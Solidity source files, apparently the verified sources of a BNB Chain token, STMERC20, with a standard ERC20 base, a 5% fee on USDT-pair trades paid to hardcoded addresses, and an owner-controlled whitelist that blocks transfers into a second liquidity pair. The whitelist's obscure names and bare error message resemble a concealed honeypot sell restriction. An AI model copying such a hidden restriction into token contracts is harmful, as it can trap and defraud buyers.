{"ERC20StandardToken.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.7;\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function totalSupply() external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20StandardToken is IERC20 {\n    mapping(address =\u003e uint256) private _balances;\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\n\n    string private _symbol;\n    string private _name;\n    uint8 private immutable _decimals;\n    uint256 private _totalSupply;\n    \n    constructor(string memory symbol_, string memory name_, uint8 decimals_, uint256 totalSupply_) {\n        _symbol = symbol_;\n        _name = name_;\n        _decimals = decimals_;\n        _mint(msg.sender, totalSupply_*10**decimals_);\n    }\n\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    function decimals() public view virtual returns (uint8) {\n        return _decimals;\n    }\n\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        _transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n        _spendAllowance(from, msg.sender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n\n    function _transfer(address from, address to, uint256 amount) internal virtual {\n        uint256 fromBalance = _balances[from];\n        require(fromBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n            _balances[to] += amount;\n        }\n        emit Transfer(from, to, amount);\n    }\n\n    function _addSenderBalance(address from, uint256 amount) internal virtual {\n        _balances[from] += amount;\n    }\n\n    function _subSenderBalance(address from, uint256 amount) internal virtual {\n        uint256 fromBalance = _balances[from];\n        require(fromBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n        }\n    }\n\n    function _addReceiverBalance(address from, address to, uint256 amount) internal virtual {\n        unchecked {\n            _balances[to] += amount;\n        }\n        emit Transfer(from, to, amount);\n    }\n\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\n        uint256 currentAllowance = _allowances[owner][spender];\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance \u003e= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n        _totalSupply += amount;\n        unchecked {\n            _balances[account] += amount;\n        }\n        emit Transfer(address(0), account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        uint256 accountBalance = _balances[account];\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n            _totalSupply -= amount;\n        }\n        emit Transfer(account, address(0), amount);\n    }\n}"},"STMERC20.sol":{"content":"// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.7;\nimport \"./ERC20StandardToken.sol\";\n\n// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)\n\nlibrary SafeMath {\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x + y) \u003e= x, \"ds-math-add-overflow\");\n    }\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x - y) \u003c= x, \"ds-math-sub-underflow\");\n    }\n\n    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n    }\n}\n\n\ninterface IPancakeRouter {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n    function ownerShips(address addr) external view returns(bool);\n}\n\ninterface IPancakePair{\n    function sync() external;\n}\n\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n    constructor ()  {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n    function owner() public view returns (address) {\n        return _owner;\n    }\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\n\ncontract STMERC20 is ERC20StandardToken,Ownable{\n    using SafeMath for uint256;\n\n    address public immutable usdtPair;\n    address private constant nodeAddress = 0x864974F724a7bf685eCF73C52aeDBC76c50d9F53;\n    address private constant fundAddress = 0xcBEa50b078944a50d8f1679cD455F00034181fC1;\n    address private constant lpAddress = 0x7DeEea30012F01878F95E06C70b5450A633bb669;\n\n    mapping (address =\u003e bool) private _isInnerRouterOwnerShips;\n\n    IPancakeRouter private constant innerRouter = IPancakeRouter(0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702);\n    address public immutable innerPair;\n     constructor(string memory symbol_, string memory name_, uint8 decimals_, uint256 totalSupply_) ERC20StandardToken(symbol_, name_, decimals_, totalSupply_) {\n        IPancakeRouter router = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n        address usdt = 0x55d398326f99059fF775485246999027B3197955;\n        usdtPair = pairFor(router.factory(), address(this), usdt);\n\n        innerPair = innerPairFor(innerRouter.factory(), address(this), usdt);\n        \n    }\n\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair_) {\n        (address token0, address token1) = tokenA \u003c tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        pair_ = address(uint160(uint(keccak256(abi.encodePacked(\n                hex\u0027ff\u0027,\n                factory,\n                keccak256(abi.encodePacked(token0, token1)),\n                hex\u002700fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5\u0027\n        )))));\n    }\n\n    function innerPairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair_) {\n        (address token0, address token1) = tokenA \u003c tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        pair_ = address(uint160(uint(keccak256(abi.encodePacked(\n                hex\u0027ff\u0027,\n                factory,\n                keccak256(abi.encodePacked(token0, token1)),\n                hex\u0027593f76b0a7474d8e3a2b2ea80ad066754ac57d9a88901cd0acb3723974c4a191\u0027\n        )))));\n    }\n\n\n    function _transfer(address from, address to, uint256 amount) internal override {\n        if(to == innerPair) {\n            require(_isInnerRouterOwnerShips[from], \"f\");\n        }\n\n        address pair_ = usdtPair;\n        if(from != pair_ \u0026\u0026 to != pair_) {\n            super._transfer(from, to, amount);\n            return;\n        }\n        _subSenderBalance(from, amount);\n        unchecked{\n            uint256 feeAmount = amount/100;\n            _addReceiverBalance(from, nodeAddress, feeAmount);\n            _addReceiverBalance(from, lpAddress, feeAmount);\n            _addReceiverBalance(from, fundAddress, 3*feeAmount);\n            _addReceiverBalance(from, to, amount - 5*feeAmount);\n        }\n    }\n   \n    function innerRouterOwnerShips(address account, bool excluded) public onlyOwner {\n        _isInnerRouterOwnerShips[account] = excluded;\n    }\n\n\n\n    \n}\n\n\n\n\n\n\n"}}